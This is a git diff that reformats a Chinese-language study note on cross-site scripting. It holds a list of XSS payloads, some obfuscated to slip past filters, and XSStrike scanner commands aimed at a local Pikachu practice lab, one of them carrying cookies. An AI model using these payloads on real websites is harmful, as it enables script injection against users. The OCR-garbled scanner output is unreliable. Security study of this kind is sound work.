@@ -8,6 +8,8 @@ tags:
 
 **<font style="background-color:#ccc1d9;">Xss有效载荷：</font>**
 
+```bash
+
 }]};(confirm)()//\
 
 <A%0aONMouseOvER%0d=%0d[8].find(confirm)>z
@@ -28,17 +30,8 @@ tags:
 
 <script>alert('XSS')</script>
 
-<img src="_<font style="color:#393939;background-color:#faf7ef;">javascript</font>_:alert('XSS')">
-
-
-
-
-
-
-
-
-
-
+<img src="javascript:alert('XSS')">
+```
 
 
 
@@ -58,8 +51,9 @@ tags:
 **<font style="color:#c00000;background-color:#b8cce4;">个人笔记：</font>**
 
 1.输入xss语句
-
+```
 <img src="invalid.jpg" onerror="console.log(1)">
+```
 
 这条语句的作用的在控制台打出1
 
@@ -80,8 +74,7 @@ tags:
 
 
 
-**<font style="color:#c00000;background-color:#ccc1d9;">xss</font>****<font style="color:#c00000;background-color:#ccc1d9;">工具：</font>**
-
+### XSS 工具
 
 
 xsstrike
@@ -102,9 +95,9 @@ xsstrike
 案例一：
 
 命令：
-
+```
 python xsstrike.py -u "[http://127.0.0.1/pikachu/vul/xss/xss_reflected_get.php?message=kobe&submit=submit](http://127.0.0.1/pikachu/vul/xss/xss_reflected_get.php?message=kobe&submit=submit)" --skip --skip-dom
-
+```
 
 
 <!-- 这是一张图片，ocr 内容为：D:)XSSTRIKE)PYTHON XSSTRIKE.PY-H "HTIP://127.0.1/P,1/PIKACHU/VAL/XSS/XSS/XSS,ROFLECTED_BENASSRGERKOBA XSSTRIKE V3.1.4 WAF STATUS: OFFLINE TESTING PARAMETER: MESSAGE REFLECTIONS FOUND:1 ANALYSING REFLECTIONS GENERATING PAYLOADS PAYLOADS GENERATED: 3072 PAYLOAD:<DETAILS%0DONTOGGLESOA-9OACONFIRM()/ EFFICIENCY:91 CONFIDENCE:10 PAYLOAD: <A/+/ONMOUSEOVER+-+[8].FIND(CONFIRM)>V3DM0S EFFICIENCY:92 CONFIDENCE:10 PAYLOAD:<A/+/ONPOINTERENTER+-+CONFIRM()>V3DM0S EFFICIENCY:91 CONFIDENCE:10 PAYLOAD: (AGOAONMOUSEOVER%OA-%OA(CONFIRM)()%0DX>V3DMOS BFFICIENCY:91 CONFIDENCE:10 PAYLOAD: <DETAILS%OAONTOGGLE+-+(PROMPT)_%ODX// EFFICIENCY:91 CONFIDENCE:10 PAYLOAD: <DETAILS%OAONTOGGLE%09-909(CONFIRM) 0%ODX> EFFICIENCY:92 CONFIDENCE:10 -->
@@ -124,9 +117,9 @@ python xsstrike.py -u "[http://127.0.0.1/pikachu/vul/xss/xss_reflected_get.php?m
 
 
 案例二：
-
+```
 python xsstrike.py -u "[http://127.0.0.1/pikachu/vul/xss/xsspost/xss_reflected_post.php](http://127.0.0.1/pikachu/vul/xss/xsspost/xss_reflected_post.php)" --data "message=1&submit=submit" --headers "Cookie: ant[uname]=admin; ant[pw]=10470c3b4b1fed12c3baac014be15fac67c6e815; csrftoken=7Gjcd9xR7MgIk7A7e0yks1RDppbErY9WYTFXpjxyYSzOPkEsscYH4xMZAfGzKuBy; PHPSESSID=slttj3hh1eig65tvj7ldppb984"
-
+```
 
 
 此命令有POST数据和Cookie
